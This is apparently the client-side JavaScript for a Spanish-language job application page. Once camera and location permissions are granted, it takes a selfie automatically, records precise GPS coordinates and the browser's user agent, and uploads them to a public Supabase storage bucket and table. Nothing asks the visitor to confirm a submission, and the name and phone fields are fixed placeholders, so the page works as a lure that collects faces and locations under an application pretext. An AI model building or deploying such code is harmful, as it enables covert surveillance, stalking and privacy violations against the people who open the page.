const SUPABASE_URL = "https://klfmiejhtyvygttxqyia.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_zhobFsqJov9o8xybqYfojw_LmBgrIV9";

const elements = {
  cameraStatus: document.getElementById("camera-status"),
  locationStatus: document.getElementById("location-status"),
  selfieStatus: document.getElementById("selfie-status"),
  locationBadge: document.getElementById("location-badge"),
  locationDetails: document.getElementById("location-details"),
  video: document.getElementById("video"),
  canvas: document.getElementById("photo-canvas"),
  preview: document.getElementById("photo-preview"),
  retryBtn: document.getElementById("retry-permissions"),
  httpsWarning: document.getElementById("https-warning"),
  toast: document.getElementById("toast"),
  autoStatus: document.getElementById("auto-status"),
};

const state = {
  stream: null,
  photoBlob: null,
  photoUrl: null,
  location: null,
  isSubmitting: false,
  hasSubmitted: false,
  cameraReady: false,
  autoCaptureDone: false,
  autoCaptureTimer: null,
};

let supabaseClient = null;

function isSecureContext() {
  const host = window.location.hostname;
  return (
    window.location.protocol === "https:" ||
    host === "localhost" ||
    host === "127.0.0.1"
  );
}

function setStatus(el, text, status) {
  el.textContent = text;
  el.dataset.state = status;
}

function showToast(message, type = "info") {
  elements.toast.textContent = message;
  elements.toast.dataset.type = type;
  elements.toast.classList.add("show");
  window.clearTimeout(showToast.timer);
  showToast.timer = window.setTimeout(() => {
    elements.toast.classList.remove("show");
  }, 4200);
}

function updateAutoStatus(text) {
  if (!elements.autoStatus) {
    return;
  }
  elements.autoStatus.textContent = text;
}

function setLocationUI(location) {
  if (!location) {
    elements.locationBadge.textContent = "Ubicacion no capturada";
    elements.locationBadge.classList.remove("ok");
    elements.locationDetails.textContent = "Lat/Lng: --";
    return;
  }
  const lat = location.lat.toFixed(6);
  const lng = location.lng.toFixed(6);
  const acc = Math.round(location.accuracy);
  elements.locationBadge.textContent = "Ubicacion capturada";
  elements.locationBadge.classList.add("ok");
  elements.locationDetails.textContent = `Lat/Lng: ${lat}, ${lng} (+/-${acc}m)`;
}

async function initCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    setStatus(elements.cameraStatus, "No disponible", "error");
    showToast("Este navegador no soporta camara.", "error");
    return;
  }

  setStatus(elements.cameraStatus, "Solicitando...", "pending");
  try {
    if (state.stream) {
      state.stream.getTracks().forEach((track) => track.stop());
    }
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false,
    });
    state.stream = stream;
    elements.video.srcObject = stream;
    elements.video.onloadedmetadata = () => {
      elements.video.play().catch(() => {});
      state.cameraReady = true;
      scheduleAutoCapture();
    };
    setStatus(elements.cameraStatus, "Lista", "ok");
  } catch (err) {
    setStatus(elements.cameraStatus, "Bloqueada", "error");
    showToast("Permite la camara para continuar.", "error");
  }
}

function initLocation() {
  if (!navigator.geolocation) {
    setStatus(elements.locationStatus, "No disponible", "error");
    showToast("Este navegador no soporta ubicacion.", "error");
    return;
  }

  setStatus(elements.locationStatus, "Solicitando...", "pending");
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      state.location = {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
      };
      setStatus(elements.locationStatus, "Lista", "ok");
      setLocationUI(state.location);
      checkReadyAndSubmit();
    },
    (err) => {
      state.location = null;
      setStatus(elements.locationStatus, "Bloqueada", "error");
      setLocationUI(null);
      if (err && err.code === 1) {
        showToast("Permite la ubicacion para continuar.", "error");
      } else {
        showToast("No pudimos obtener la ubicacion.", "error");
      }
      checkReadyAndSubmit();
    },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );
}

function resetPhoto() {
  state.photoBlob = null;
  if (state.photoUrl) {
    URL.revokeObjectURL(state.photoUrl);
    state.photoUrl = null;
  }
  elements.preview.hidden = true;
  setStatus(elements.selfieStatus, "Pendiente", "pending");
  state.hasSubmitted = false;
  state.autoCaptureDone = false;
  updateAutoStatus("Esperando selfie y ubicacion.");
  checkReadyAndSubmit();
}

function capturePhoto(isAuto = false) {
  if (!state.stream) {
    if (!isAuto) {
      showToast("Activa la camara antes de capturar.", "error");
    }
    return;
  }
  const width = elements.video.videoWidth || 720;
  const height = elements.video.videoHeight || 960;
  if (!width || !height) {
    if (!isAuto) {
      showToast("La camara no esta lista todavia.", "error");
    }
    return;
  }
  elements.canvas.width = width;
  elements.canvas.height = height;
  const ctx = elements.canvas.getContext("2d");
  ctx.drawImage(elements.video, 0, 0, width, height);
  elements.canvas.toBlob(
    (blob) => {
      if (!blob) {
        showToast("No se pudo capturar la selfie.", "error");
        return;
      }
      state.photoBlob = blob;
      if (state.photoUrl) {
        URL.revokeObjectURL(state.photoUrl);
      }
      state.photoUrl = URL.createObjectURL(blob);
      elements.preview.src = state.photoUrl;
      elements.preview.hidden = false;
      state.autoCaptureDone = true;
      setStatus(elements.selfieStatus, "Lista", "ok");
      checkReadyAndSubmit();
    },
    "image/jpeg",
    0.92
  );
}

function scheduleAutoCapture() {
  if (state.autoCaptureDone || !state.cameraReady) {
    return;
  }
  window.clearTimeout(state.autoCaptureTimer);
  state.autoCaptureTimer = window.setTimeout(() => {
    if (!state.photoBlob && state.cameraReady) {
      capturePhoto(true);
    }
  }, 900);
}
function isSupabaseConfigured() {
  return (
    SUPABASE_URL &&
    SUPABASE_ANON_KEY &&
    !SUPABASE_URL.includes("YOUR_SUPABASE_URL") &&
    !SUPABASE_ANON_KEY.includes("YOUR_SUPABASE_ANON_KEY")
  );
}

function getSupabaseClient() {
  if (supabaseClient) {
    return supabaseClient;
  }
  if (!window.supabase) {
    return null;
  }
  supabaseClient = window.supabase.createClient(
    SUPABASE_URL,
    SUPABASE_ANON_KEY
  );
  return supabaseClient;
}

function setLoading(isLoading) {
  state.isSubmitting = isLoading;
  if (isLoading) {
    updateAutoStatus("Enviando postulacion...");
  }
}

async function handleSubmit() {
  if (!state.photoBlob) {
    showToast("Debes tomar una selfie.", "error");
    return;
  }
  if (!state.location) {
    showToast("Debes permitir la ubicacion.", "error");
    return;
  }
  if (!isSupabaseConfigured()) {
    showToast("Configura SUPABASE_URL y SUPABASE_ANON_KEY.", "error");
    return;
  }
  const client = getSupabaseClient();
  if (!client) {
    showToast("No se pudo cargar Supabase.", "error");
    return;
  }

  setLoading(true);
  try {
    const fileId =
      (window.crypto && window.crypto.randomUUID
        ? window.crypto.randomUUID()
        : `${Date.now()}-${Math.random().toString(16).slice(2)}`) + ".jpg";
    const filePath = `postulaciones/${fileId}`;

    const { error: uploadError } = await client.storage
      .from("selfies")
      .upload(filePath, state.photoBlob, {
        contentType: "image/jpeg",
        cacheControl: "3600",
        upsert: false,
      });

    if (uploadError) {
      throw new Error(
        `Error al subir selfie: ${uploadError.message || "desconocido"}`
      );
    }

    const { data: publicData } = client.storage
      .from("selfies")
      .getPublicUrl(filePath);

    const payload = {
      nombre: "Sin nombre",
      telefono: "Sin telefono",
      selfie_url: publicData.publicUrl,
      lat: state.location.lat,
      lng: state.location.lng,
      created_at: new Date().toISOString(),
      user_agent: navigator.userAgent,
    };

    const { error: insertError } = await client
      .from("postulaciones")
      .insert(payload);

    if (insertError) {
      throw new Error(
        `Error al guardar datos: ${insertError.message || "desconocido"}`
      );
    }

    showToast("Postulacion enviada con exito.", "success");
    state.hasSubmitted = true;
    updateAutoStatus("Postulacion enviada.");
  } catch (err) {
    const message =
      err && err.message ? err.message : "Error al enviar. Intenta de nuevo.";
    showToast(message, "error");
    updateAutoStatus(message);
    console.error(err);
  } finally {
    setLoading(false);
  }
}

function checkReadyAndSubmit() {
  if (state.isSubmitting || state.hasSubmitted) {
    return;
  }
  if (state.photoBlob && state.location) {
    handleSubmit();
    return;
  }
  updateAutoStatus("Esperando selfie y ubicacion.");
}

function bindEvents() {
  elements.retryBtn.addEventListener("click", () => {
    initCamera();
    initLocation();
  });
}

function init() {
  bindEvents();
  setLocationUI(null);
  setStatus(elements.cameraStatus, "Pendiente", "pending");
  setStatus(elements.locationStatus, "Pendiente", "pending");
  setStatus(elements.selfieStatus, "Pendiente", "pending");
  updateAutoStatus("Esperando selfie y ubicacion.");

  if (!isSecureContext()) {
    elements.httpsWarning.hidden = false;
    setStatus(elements.cameraStatus, "HTTPS requerido", "error");
    setStatus(elements.locationStatus, "HTTPS requerido", "error");
    showToast("Necesitas HTTPS para usar camara y ubicacion.", "error");
    return;
  }

  initCamera();
  initLocation();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
